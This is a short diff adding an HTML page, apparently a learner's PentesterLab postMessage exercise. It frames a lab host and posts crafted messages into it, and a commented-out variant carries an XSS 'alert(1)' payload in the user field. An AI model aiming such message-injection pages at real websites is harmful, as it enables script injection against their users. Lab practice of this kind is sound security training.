@@ -1,1 +1,21 @@
-/home/lcebrero/Documents/pentesterlab/postMessage/postMessage2.html
+<!DOCTYPE html>
+<head><title>Malicious postMessage</title></head>
+<body>
+	<h1>Kak the wooooooooooorld</h1>
+	<button onclick="kakwea()">KEKEAR</button> 
+	<iframe id="kak" src="http://ptl-e6ecaad6-7978b7a1.libcurl.so/" width="500" height="500"></iframe>
+	
+	
+	<script>
+		function kakwea(){
+			var iframewea = document.getElementById('kak').contentWindow;
+			iframewea.postMessage("user=ASDFASF&id=3");
+			/*
+			var vulnurl = "http://ptl-e6ecaad6-7978b7a1.libcurl.so/"
+			sweetchildomine = window.open(vulnurl, "width=500,height=500");
+			sweetchildomine.postMessage("user=<script>alert(1)<\script>&id=0");
+			*/
+		};
+	</script>
+</body>
+</html>
